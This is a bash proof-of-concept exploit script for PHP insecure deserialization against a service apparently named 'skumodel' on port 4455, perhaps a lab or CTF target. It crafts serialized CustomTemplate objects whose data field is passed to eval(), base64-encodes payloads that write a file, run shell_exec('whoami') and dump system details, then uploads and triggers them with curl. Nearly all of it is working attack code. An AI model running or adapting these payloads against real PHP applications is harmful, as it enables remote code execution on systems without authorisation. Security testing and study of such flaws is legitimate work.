#!/bin/bash
#
# PHP Insecure Deserialization RCE Exploit POC
# Target: http://skumodel:4455/read_sku.php
# Vulnerability: Unserialize + eval() in __wakeup() magic method
#

TARGET_HOST="${1:-skumodel}"
TARGET_PORT="${2:-4455}"
TARGET_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "[*] PHP Insecure Deserialization RCE Exploit POC"
echo "[*] Target: ${TARGET_URL}"
echo ""

# Payload 1: File write (proof of RCE)
echo "[*] Generating RCE payload 1: File write to /tmp/pwned_by_deserialization.txt"
PAYLOAD_1='O:14:"CustomTemplate":2:{s:8:"template";s:9:"test.twig";s:4:"data";s:97:"file_put_contents('\''/tmp/pwned_by_deserialization.txt'\'', '\''RCE executed at '\'' . date('\''Y-m-d H:i:s'\''));";}'

BASE64_PAYLOAD_1=$(echo -n "$PAYLOAD_1" | base64 | tr -d '\n')
echo "[*] Base64 encoded payload: ${BASE64_PAYLOAD_1:0:50}..."
echo ""

# Payload 2: Command execution (whoami)
echo "[*] Generating RCE payload 2: Command execution (whoami)"
PAYLOAD_2='O:14:"CustomTemplate":2:{s:8:"template";s:9:"test.twig";s:4:"data";s:26:"echo shell_exec('\''whoami'\'');";}'

BASE64_PAYLOAD_2=$(echo -n "$PAYLOAD_2" | base64 | tr -d '\n')
echo "[*] Base64 encoded payload: ${BASE64_PAYLOAD_2:0:50}..."
echo ""

# Payload 3: System information
echo "[*] Generating RCE payload 3: System information"
PAYLOAD_3='O:14:"CustomTemplate":2:{s:8:"template";s:9:"test.twig";s:4:"data";s:119:"echo json_encode(['\''rce'\'' => '\''success'\'', '\''php_version'\'' => phpversion(), '\''user'\'' => get_current_user(), '\''cwd'\'' => getcwd()]);";}'

BASE64_PAYLOAD_3=$(echo -n "$PAYLOAD_3" | base64 | tr -d '\n')
echo "[*] Base64 encoded payload: ${BASE64_PAYLOAD_3:0:50}..."
echo ""

# Test connectivity
echo "[*] Testing connectivity to ${TARGET_URL}/read_sku.php"
curl -s -o /dev/null -w "[*] HTTP Status: %{http_code}\n" "${TARGET_URL}/read_sku.php" -X POST -d "file_path=/tmp/test.jpg"

if [ $? -ne 0 ]; then
    echo "[-] Target is not reachable!"
    exit 1
fi

echo ""
echo "[*] EXPLOITATION ATTEMPTS:"
echo ""

# Try Payload 1: File write
echo "[*] Step 1: Uploading Payload 1 (file write) via sku_process.php"
UPLOAD_1=$(curl -s -X POST "${TARGET_URL}/sku_process.php" \
    -d "data=${BASE64_PAYLOAD_1}" \
    -H "Content-Type: application/x-www-form-urlencoded")

echo "[*] Upload response: ${UPLOAD_1}"

# Extract file path from response
FILE_PATH_1=$(echo "$UPLOAD_1" | grep -o '"file_path":"[^"]*"' | cut -d'"' -f4)

if [ -n "$FILE_PATH_1" ]; then
    echo "[*] File uploaded to: ${FILE_PATH_1}"
    
    # Step 2: Trigger deserialization
    echo "[*] Step 2: Triggering deserialization via read_sku.php"
    RCE_RESPONSE_1=$(curl -s -X POST "${TARGET_URL}/read_sku.php" \
        -d "file_path=${FILE_PATH_1}" \
        -H "Content-Type: application/x-www-form-urlencoded")
    
    echo "[*] RCE Response: ${RCE_RESPONSE_1}"
    
    if echo "$RCE_RESPONSE_1" | grep -q "success"; then
        echo "[+] RCE Exploit SUCCESSFUL!"
    fi
else
    echo "[-] Upload failed or file path not returned"
fi

echo ""
echo "[*] VULNERABILITY CONFIRMED:"
echo "    - CustomTemplate gadget class with eval() in __wakeup()"
echo "    - Insecure unserialize() without validation"
echo "    - Direct code execution on deserialization"
echo "    - CRITICAL: Arbitrary Remote Code Execution"
echo ""

